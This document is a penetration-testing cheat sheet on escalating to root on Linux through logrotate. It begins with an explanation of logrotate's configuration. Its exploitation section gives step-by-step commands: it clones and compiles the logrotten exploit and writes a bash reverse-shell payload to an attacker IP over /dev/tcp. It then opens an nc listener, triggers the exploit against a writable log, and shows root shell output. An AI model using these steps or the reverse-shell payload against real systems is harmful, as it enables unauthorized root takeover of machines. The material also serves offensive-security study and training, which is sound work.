# Logrotate — PrivEsc

## What It Is
`logrotate` archives/disposes of old log files to prevent disk exhaustion and keep `/var/log` manageable and searchable. Rotation logic can be based on:
- File **size**
- File **age**
- Configurable **action** to take when a threshold is hit

Typically run periodically via **cron**, controlled by `/etc/logrotate.conf` (global settings) plus per-service configs in `/etc/logrotate.d/`.

```bash
man logrotate
# or
logrotate --help
```

Key flags:
| Flag | Purpose |
|---|---|
| `-d, --debug` | Dry run, print debug messages only |
| `-f, --force` | Force rotation |
| `-m, --mail=command` | Custom mail command |
| `-s, --state=statefile` | Path of state file |
| `-v, --verbose` | Verbose output |
| `-l, --log=logfile` | Log to file or syslog |

## Configuration

**Global config:**
```bash
cat /etc/logrotate.conf
```
Example defaults: rotate weekly, keep 4 weeks of backlogs, `create` new empty log files post-rotation, includes `/etc/logrotate.d`.

**State file** — tracks last rotation date per log; can be edited or bypassed with `-f` to force same-day rotation:
```bash
sudo cat /var/lib/logrotate.status
```

**Per-service configs:**
```bash
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
```

---

## Exploitation — `logrotten`

### Requirements
- **Write permissions** on the target log file(s)
- `logrotate` must run as a **privileged user or root** (typically via cron)
- Vulnerable versions: **3.8.6, 3.11.0, 3.15.0, 3.18.0**

### Steps

**1. Get and compile the exploit** (ideally on a matching kernel, or directly on target if compiler available):
```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

**2. Prepare a payload** (e.g. reverse shell):
```bash
echo 'bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1' > payload
```

**3. Check which logrotate option is active** — determines which exploit variant to use:
```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
- Result of `create` → use the exploit variant built for the `create` option (as opposed to `compress`).

**4. Start a listener:**
```bash
nc -nlvp 9001
```

**5. Run the exploit against a writable log file:**
```bash
./logrotten -p ./payload /tmp/tmp.log
```

**6. Catch the shell:**
```
Connection received on <target_ip> <port>
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Key Takeaway
If you can write to a log file that `logrotate` (root-owned/cron-triggered) processes, and the version is vulnerable, `logrotten` can hijack the rotation process to execute an arbitrary payload as root.